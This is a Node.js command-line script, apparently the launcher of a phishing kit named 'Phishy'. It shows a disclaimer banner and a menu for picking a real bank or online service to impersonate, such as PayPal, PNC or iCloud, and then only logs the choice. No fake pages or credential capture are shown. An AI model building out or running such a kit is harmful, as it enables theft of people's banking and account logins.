#!/usr/bin/node

'use strict';

const fs = require('fs');
const http = require('http');
const ngrok = require('ngrok');
const inquirer = require('inquirer');
const { exec } = require('child_process');

console.log(`

    :: Disclaimer: Developers assume no liability and are not ::
    :: responsible for any misuse or damage caused by Phishy. ::
    :: Only use for educational purposes!                     ::

                     .                  Twitter | https://www.twitter.com/ant_devs
                    ":"                   
                  ___:____     |"\/"|       
                ,'        '.    \  /       
                |  O        \___/  |
                ~^~^~^~^~^~^~^~^~^~^~^~^~
        ██████  ██   ██ ██ ███████ ██   ██ ██    ██ 
        ██   ██ ██   ██ ██ ██      ██   ██  ██  ██  
        ██████  ███████ ██ ███████ ███████   ████   
        ██      ██   ██ ██      ██ ██   ██    ██    
        ██      ██   ██ ██ ███████ ██   ██    ██                                            
`);

inquirer
	.prompt([
		{
			type: 'list',
			name: 'website',
			message: 'Please choose a website',
			choices: [
				'Bank of America',
				'Royal Credit Union',
				'PNC',
				'Amazon',
				'Google',
				'iCloud',
				'Instagram',
				'LinkedIn',
				'PayPal',
			],
		},
	])
	.then((answer) => {
		const ans = answer.website;

		const website = ans.split(' ').join('').toLowerCase();

		console.log(website);
	});
